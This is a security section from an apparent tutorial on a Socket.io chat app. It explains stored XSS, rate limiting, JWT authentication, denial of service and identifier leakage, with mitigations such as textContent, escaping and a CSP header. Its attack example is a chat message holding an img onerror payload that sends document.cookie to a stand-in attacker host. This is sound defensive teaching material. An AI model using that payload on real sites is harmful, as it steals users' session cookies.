# S06 Chat Rooms — Security

## Cross-Site Scripting (XSS) in Chat Messages

Chat applications are prime targets for **Stored XSS** because user input is rendered to other users' browsers.

### Attack Example
An attacker sends:
```json
{
  "room": "general",
  "text": "<img src=x onerror='fetch(\"https://attacker.com/?c=\"+document.cookie)'>"
}
```
If the client renders this with `innerHTML`, the JavaScript executes in every room member's browser, stealing cookies or performing actions on their behalf.

### Mitigations

1. **Client-Side Output Encoding**
   Use `textContent` instead of `innerHTML`:
   ```javascript
   const el = document.createElement('div');
   el.textContent = message.text; // HTML chars become entities
   chatLog.appendChild(el);
   ```

2. **Server-Side Sanitization**
   Strip or escape HTML before broadcasting:
   ```typescript
   import escapeHtml from 'escape-html';
   const safeText = escapeHtml(data.text);
   ```

3. **Content Security Policy (CSP)**
   ```http
   Content-Security-Policy: default-src 'self'; script-src 'self'; connect-src 'self' ws: wss:;
   ```
   Even if an attacker injects a `<script>` tag, the browser refuses to execute it.

## Rate Limiting & Flooding

Without rate limiting, a single client can spam thousands of messages per second, degrading performance for all users.

### Alternatives
1. **Token bucket per socket** (e.g., 10 messages per 10 seconds)
2. **Global rate limit per room** (prevents any single user from dominating)
3. **CAPTCHA for rapid reconnections** (prevents bot abuse)

## Authentication & Authorization

The current app uses anonymous socket IDs. In production:
- Validate JWT tokens during the Socket.io handshake (`io.use((socket, next) => { ... })`).
- Check room membership permissions before allowing `join`.
- Sign messages with the authenticated `user_id`, not the ephemeral `socket.id`.

## Denial of Service

- **Large payloads**: Limit message size (e.g., 4 KB). WebSocket frames can theoretically carry 2^63 bytes; unbounded frames exhaust memory.
- **Connection exhaustion**: A single IP can open thousands of WebSocket connections. Use `ulimit`, reverse-proxy connection limits, or Cloudflare.

## Information Leakage

The current implementation broadcasts the raw `socket.id` in notifications. While not a secret, it leaks internal connection identifiers. Use display names or hashed IDs instead.
